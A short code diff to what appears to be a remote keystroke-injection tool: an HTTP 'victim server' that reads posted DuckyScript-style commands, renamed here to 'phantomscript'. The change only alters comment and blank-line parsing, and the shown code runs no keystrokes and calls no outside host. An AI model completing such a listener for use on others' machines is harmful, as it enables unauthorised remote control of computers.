@@ -1,12 +1,12 @@
 import keyboard
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-def try_run_from_duckyscript_command(duckyscript_command: str):
-    if duckyscript_command.startswith("REM") or duckyscript_command.isspace() or not duckyscript_command:
+def try_run_from_phantomscript_command(phantomscript_command: str):
+    phantomscript_command = phantomscript_command.strip()
+    
+    if phantomscript_command.startswith(("#", '//')) or not phantomscript_command:
         return True
     
-    duckyscript_command = duckyscript_command.strip()
-
     return False
 
 class PhantomLinkVictimServer(BaseHTTPRequestHandler):
@@ -16,7 +16,7 @@ class PhantomLinkVictimServer(BaseHTTPRequestHandler):
                 payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                 print(payload)
                 for line in payload.splitlines():
-                    if not try_run_from_duckyscript_command(line):
+                    if not try_run_from_phantomscript_command(line):
                         self.send_response(422)
                         self.end_headers()
                         return
